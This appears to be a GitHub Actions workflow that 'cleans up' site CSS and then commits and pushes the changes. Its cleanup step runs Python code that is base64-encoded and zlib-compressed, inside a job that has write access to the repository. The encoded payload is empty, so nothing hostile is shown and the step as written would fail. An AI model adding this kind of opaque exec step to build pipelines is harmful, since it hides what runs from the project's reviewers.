name: Centralize header styles

on:
  push:
    branches:
      - main
    paths:
      - .github/workflows/centralize-header.yml

permissions:
  contents: write

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply cleanup
        shell: bash
        run: |
          python -c "import zlib,base64;exec(zlib.decompress(base64.b64decode('')))"
      - name: Commit cleanup
        shell: bash
        run: |
          git config user.name "masoon-site-cleanup"
          git config user.email "actions@users.noreply.github.com"
          git add assets/global.css assets/unified-design-base-20260907.css assets/unified-design.css assets/contact.css
          if git diff --cached --quiet; then
            echo "No changes to commit"
            exit 0
          fi
          git commit -m "Kopfzeile global vereinheitlichen"
          git push
